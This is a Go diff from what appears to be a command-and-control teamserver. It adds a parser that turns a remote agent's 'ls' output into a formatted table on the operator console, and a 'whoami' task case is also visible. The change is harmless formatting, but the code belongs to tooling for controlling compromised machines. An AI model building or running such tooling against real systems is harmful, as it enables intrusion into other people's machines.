@@ -997,9 +997,48 @@ func (a *Agent) TenguTaskDispatch(RequestID uint32, CommandID uint32, Parser *pa
 			return
 		}
 
+		// Formater la sortie ls comme un tableau lisible dans la console
+		var lsFormatted string
+		var lsData map[string]interface{}
+		if jsonErr := json.Unmarshal([]byte(output), &lsData); jsonErr == nil {
+			if files, ok := lsData["Files"].([]interface{}); ok {
+				var sb strings.Builder
+				sb.WriteString(fmt.Sprintf("  %-11s  %10s  %-19s  %s\n", "Permissions", "Size", "Modified", "Name"))
+				sb.WriteString(fmt.Sprintf("  %s  %s  %s  %s\n",
+					strings.Repeat("-", 11), strings.Repeat("-", 10),
+					strings.Repeat("-", 19), strings.Repeat("-", 20)))
+				for _, f := range files {
+					fm, ok := f.(map[string]interface{})
+					if !ok {
+						continue
+					}
+					perm, _ := fm["Permissions"].(string)
+					size, _ := fm["Size"].(string)
+					mod, _  := fm["Modified"].(string)
+					name, _ := fm["Name"].(string)
+					ftype, _ := fm["Type"].(string)
+					if perm == "" {
+						if ftype == "dir" {
+							perm = "d---------"
+						} else {
+							perm = "----------"
+						}
+					}
+					displayName := name
+					if ftype == "dir" {
+						displayName = name + "/"
+					}
+					sb.WriteString(fmt.Sprintf("  %-11s  %10s  %-19s  %s\n", perm, size, mod, displayName))
+				}
+				lsFormatted = sb.String()
+			}
+		}
+		if lsFormatted == "" {
+			lsFormatted = output
+		}
 		teamserver.AgentConsole(a.DisplayID, MUGEN_CONSOLE_MESSAGE, map[string]string{
 			"Type":   "Good",
-			"Output": output,
+			"Output": lsFormatted,
 		})
 
 	case TENGU_WHOAMI:
